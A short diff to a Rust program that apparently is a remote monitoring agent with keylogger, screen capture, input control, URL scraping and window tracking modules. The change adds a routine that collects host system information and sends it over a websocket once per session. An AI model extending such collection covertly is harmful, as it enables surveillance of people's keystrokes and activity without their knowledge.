@@ -46,6 +46,7 @@ mod capture;
 mod config;
 mod input;
 mod keylogger;
+mod system_info;
 mod ui;
 mod url_scraper;
 mod window_tracker;
@@ -428,6 +429,10 @@ async fn run_session(
         let _ = ws_tx.close().await;
     });
 
+    // ── Send system info once per session ────────────────────────────────
+    let info_payload = system_info::collect_agent_info().to_string();
+    let _ = out_tx.send(Message::Text(info_payload)).await;
+
     // ── Input controller ──────────────────────────────────────────────────
     let mut controller = InputController::new().context("Failed to create input controller")?;
 
@@ -657,7 +662,7 @@ fn set_status(status: &Mutex<AgentStatus>, s: AgentStatus) {
 }
 
 #[inline]
-fn unix_timestamp_secs() -> u64 {
+pub(crate) fn unix_timestamp_secs() -> u64 {
     std::time::SystemTime::now()
         .duration_since(std::time::UNIX_EPOCH)
         .unwrap_or_default()
